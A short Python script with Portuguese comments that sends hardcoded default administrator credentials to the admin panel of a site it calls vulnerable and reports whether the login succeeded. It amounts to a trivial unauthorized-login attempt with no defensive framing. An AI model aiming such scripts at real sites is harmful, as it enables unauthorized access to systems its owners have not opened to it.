import requests

# Endereço do site vulnerável
url = "http://site-vulneravel.com/painel-administrativo"

# Dados da conta de administrador
dados = {
    "username": "admin",
    "password": "SenhaAdmin"
}

# Envia a solicitação de login com os dados de administrador
response = requests.post(url, data=dados)

# Verifica se a autenticação foi bem-sucedida
if "Bem-vindo, administrador" in response.text:
    print("Autenticação bem-sucedida!")
else:
    print("Autenticação falhou.")
